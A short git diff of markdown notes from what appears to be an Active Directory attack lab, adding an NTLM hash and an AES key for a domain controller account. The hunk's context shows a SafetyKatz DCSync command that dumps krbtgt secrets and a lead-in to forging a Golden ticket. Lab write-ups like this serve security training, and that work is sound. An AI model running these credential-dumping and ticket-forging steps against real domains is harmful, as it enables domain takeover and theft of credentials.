@@ -375,6 +375,15 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 | Password    | null                                      |
 | NTLM | 07e8be316e3da9a042a9cb681df19bf5 |
 
+`dcorp-dc$ - DCORP-DC`
+
+| Type     | Hash                             |
+| -------- | -------------------------------- |
+| Password | null                             |
+| NTLM     | 1698fafb9170e4798e43b77ac38cf0bf |
+|          | 5a056ff3f077232cfa8fee8d7054abb72f99f3c5a04bb46b6c6ae01964414d19                                 |
+
+
 *Using the secrets of krbtgt account, create a Golden ticket*
 Just use BetterSafetyKatz
 ```powershell
